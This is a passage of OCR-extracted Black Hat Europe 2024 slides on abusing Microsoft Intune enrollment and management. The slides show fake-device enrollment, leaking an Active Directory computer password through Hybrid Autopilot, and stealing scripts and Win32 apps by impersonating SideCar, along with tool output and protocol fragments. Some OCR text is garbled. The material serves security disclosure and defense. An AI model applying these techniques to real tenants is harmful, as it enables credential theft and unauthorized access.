EUROPE 2024
Exfiltrating Line-Of-Business apps via OMA DM Sync
[!] we found Line-of-business app...
downloading msi file from
https: //fef.msuc06.manage.microsoft.com/ContentService/DownLoadService/GetAppActive/WinRT?contentGuid=22cce2e1-e62¢
4142-b7cb-c875@cd5/ddaofilLeNameHash=45d9c902-8d79-417a-8414-4b21948011dd.msi.bin&api-version=1.0
[+] successtully downloaded to| 45d9c902-8d79-417a-8414-4b21948611dd.msi
```

## Slide 64

##### **Autopilot**

- automatically join Windows devices to Microsoft Entra ID and Microsoft Intune

Shipped to employee Employee

Self deploy

Microsoft Entra ID/ Microsoft Intune

#BHEU @BlackHatEvents

## Slide 65

##### **Autopilot**

• Also allow devices to join on-premise Active Directory (= **Hybrid Autopilot** )

1. Enroll Autopilot device to Intune

2. Send enrolled device info

3. Create computer object and get offline domain join blob

**Autopilot Device**

**Microsoft Intune**

**Intune Connector**

**Active Directory**

5. Receive domain join blob and join domain

4. Send back offline domain join blob to Intune

#BHEU @BlackHatEvents

## Slide 66

###### Send Hardware Hash through DM Sync

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Send Hardware Hash through DM Sync
<Item>
<Source>
<LocURI>
. /DevDetail/Ext/DeviceHardwareData
</LocURI>
</Source>
<Met a>
<Format xmlns="syncml:metinf">
chr
</Format>
</Meta>
<Data>
TOGWAgEAHAAAAAoASQdhSgAACgCdBIFKPFbMLeQCCQUCABAAC QABAATAAGAAAAAABQAZAATAAAAAAAAAT QAAAAAAAABAAAFAAWMAEQBHZWSlaW5S1l
s
c
N
D
b
I
=
YoHS8AH1 fr8zsuE89X9SGRLYhHEmyLWV f6Wh6wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Vee OP ot Pp
```

## Slide 67

###### Deliver Offline Domain Join Blob via OMA DM Sync

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Deliver Offline Domain Join Blob via OMA DM Sync
<Exec>
<CmdID>
18
</CmdID>
<Item>
<Target>
<LocURI>
. /Vendor/MSFT/OfflineDomainJoin/Blohb
</LocURI>
</Target>
<Met a>
<Format xmlns="syncml:metinf">
bé4
</Format>
<Type xmlns="syncml:metinf">
text/plain
</Type>
</Met a>
<Data>
ARAIAMzMzMzwCAAAAAAAAAAAAGABAAAAAGAAAAQAAGACAAAAAQAAAGADAAAT AAT AAGAAAF GFAAAMAAIAYAMAAAE QCADMzMzMUAMAAAAAAAAAZp qqY¥K
B s
iw .F
U A
s w
B a
AHoANAByAEMAXgAAAAAAB QAAAAAAAAAEAAAACGB LAGwWAbgALAAAAAAAAAAOAAAB “AHUADABUAC 4ADABVAGMAYQBSAASAAAAAAAAAC gAAAHYAAQBSAG
```

## Slide 68

###### Leaking Active Directory account’s credential

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Leaking Active Directory account’s credential
[*] parse domain join info...
- domain: vuln.local
- computername: DESKTOP-U60mwcz$
- computerpass: Y[eVsul2UGGMNP- "U>FZEqM#5WsetH46CO#1*,bSs $]30L"4&Tcol#[*; ]x7+?
```

## Slide 69

##### **Attack Scenario #3**

- Attackers can **enroll fake device** to Microsoft Intune and communicate with its management server through OMA-DM

- Attackers can steal **device configurations** related to internal network assets

- If Hybrid Autopilot is implemented, **Domain Computer credentials** can also be leaked

#BHEU @BlackHatEvents

## Slide 70

##### **Recommendation**

- Create a **device filter** and deploy **enrollment restriction** to prevent rogue device from being enrolled to Microsoft Intune

- • Defend your organization against **credential phishing and device code phishing** through, for example, conditional access policies

#BHEU @BlackHatEvents

## Slide 71

###### **Attacking on Enrollment**

- ✓ **Conditional Access bypass through Intune Company Portal** ✓ **Device object deletion through enrollment process**

###### **Attacking on Management**

- ✓ **Establishing a foothold through OMA DM**

- ✓ **Riding a SideCar for fun & profits**

#BHEU @BlackHatEvents

## Slide 72

##### **Application Management**

• Examples of apps delivered in Windows

**App types File types Line-of-Business** msi, msix, msixbundle **apps** appx and appxbundle **PowerShell scripts** ps1

**PowerShell scripts**

###### **Delivery**

via DM Client via **Intune Management Extension** aka **SideCar**

**Win32 apps** exe, batch files and more

#BHEU @BlackHatEvents

## Slide 73

**Intune Management Extension (IME) - SideCar -**

- automatically installed through the OMA DM session

- allows IT admins to push and manage Win32 apps and PowerShell scripts

   - Win32 apps are packed into **intunewin** file for delivery

#BHEU @BlackHatEvents

## Slide 74

##### **Overview of app deployments by SideCar**

Management Server

(r.manage.microsoft.com)

DM command to install IME

DM Client

CDN Server

(*.azureedge.net)

Download & Install IME

###### SideCar Gateway Service

(fef.msuc0*.manage.microsoft.com)

SideCar Gateway Session

IME (SideCar)

CDN Server

(*-mscdn.manage.microsoft.com)

Download encrypted .intunewin file

#BHEU @BlackHatEvents

## Slide 75

##### **SideCar Gateway Session**

- JSON data is exchanged for communication

   - Authenticated via Intune device certificate

   - Gateway API is specified in the request from SideCar

```
PUT
```

```
/TrafficGateway/TrafficRoutingService/SideCar/StatelessSideCarGatewayService/SideCar
GatewaySessions('a6ac2acc-ee78-440f-ae02-c7ec350fec6a')?api-version=1.5 HTTP/1.1
Host: fef.msuc06.manage.microsoft.com
(snip)
{
```

- `"Key": "a6ac2acc-ee78-440f-ae02-c7ec350fec6a",`

`"SessionId": "a6ac2acc-ee78-440f-ae02-c7ec350fec6a",` `"RequestContentType": "PolicyRequest",` **Gateway API** `"RequestPayload": "[]",`

#BHEU @BlackHatEvents

## Slide 76

##### **Downloading PowerShell scripts**

• **PolicyRequest** directly sends us raw PowerShell scripts

• The following is an example of downloading a script that only executes “whoami”

#BHEU @BlackHatEvents

## Slide 77

- **Downloading Win32 apps**

- • **GetContentInfo** returns “DecryptInfo” that contains **encrypted .intunewin file URL** and **AES key / IV**

   - DecryptInfo is encrypted and decrypted by the private key of the Intune device certificate

#BHEU @BlackHatEvents

## Slide 78

##### **Downloading Win32 apps**

• intunewin file can be downloaded and decrypted with the AES key / IV •Oliver Kieselbach did a great research on decrypting intunewin file ☺

#BHEU @BlackHatEvents

## Slide 79

##### **Exfiltrating Win32 apps through SideCar**

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Exfiltrating Win32 apps through SideCar
|
£ | ContosoCorpCustomApp.intunewin — O 8
Archive Edit View Help
Ld 4 a
| | & Open ¥ bo Extract es
Location:
Name ¥ Size Type Date Modified
-m=| ContosoCorpCustomApp.exe 55.2 kB Windows or... 20 October 2024, 0...
```

## Slide 80

##### **Attack Scenario #4**

- Attackers can **impersonate SideCar with the enrolled device certificate**

- Attackers can steal **PowerShell scripts** and **Win32 apps** from SideCar Gateway service

   - Custom apps tend to contain juicy information such as credentials of local Administrator passwords and more

#BHEU @BlackHatEvents

## Slide 81

##### **Recommendation**

- Try not to deliver apps with secrets

   - Delivering apps only for a particular dynamic device group can be bypassed by entirely faking the Intune protocol

Ex) Deliver a privileged service principal‘s certificate to a dynamic group for devices whose names start with “ADMIN-”

#BHEU @BlackHatEvents

## Slide 82

## Tools & Demo

#BHEU @BlackHatEvents

## Slide 83

##### **Pytune**

- enroll fake device to Intune through stolen credentials or tokens **Key Features Supported Platform**

Entra Join/Delete

Intune Enroll/Retire

Android

iOS/macOS

Check-in

Check
Compliant Status

Download
Windows
Apps & Scripts

Linux

Chrome OS

<u>https://github.com/secureworks/pytune</u>

#BHEU @BlackHatEvents

## Slide 84

##### **Demo**

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pis hat x —
EUROPE 2024
kali - VMware Workstation
TP4IUE wE(E)
[fp wintodev kali
EBM Kali@kali: ~/Desktopworkypytune
File Actions Edit View Help
C:\home\kali\Desktop\work\pytune> ff
5:14 AM
```

## Slide 85

## Takeaways

#BHEU @BlackHatEvents

## Slide 86

##### **Black Hat Europe Sound Bytes**

✓ Microsoft Intune offers various features for corporate device management and, also **provides opportunities for adversaries** ✓ Attackers can leverage Microsoft Intune for **breaking into your on-premise and cloud resources**

- ✓ **Review and harden configurations** provided by Microsoft to secure modern device management

#BHEU @BlackHatEvents

## Slide 87

# Q&A @TEMP43487580 @優也-中堂-2601a596

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WA\
{ CO
¢ y ip ) | ‘ - ,
EUROPE 20 Cen
-_
== Q&A |
Y @TEMP43487580
@f2#th--h =-2601a596
```

## Slide 88

# Thank you

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Middx Dural! Vj.
a 20
=3 — Thank ‘W, -
IC
```

## Slide 89

###### Previous Research & Reference

- <u>https://aadinternals.com/post/mdm/</u>

- <u>https://msendpointmgr.com/2019/01/18/how-to-decode-intune-win32-app-packages/</u>

- <u>https://dirkjanm.io/assets/raw/Insomnihack%20Breaking%20and%20fixing%20Azure%20AD%20device%20identity%2 0security.pdf</u>

- <u>https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-filter-for-applications</u>

- <u>https://learn.microsoft.com/en-us/windows/client-management/mdm-overview</u>

#BHEU @BlackHatEvents
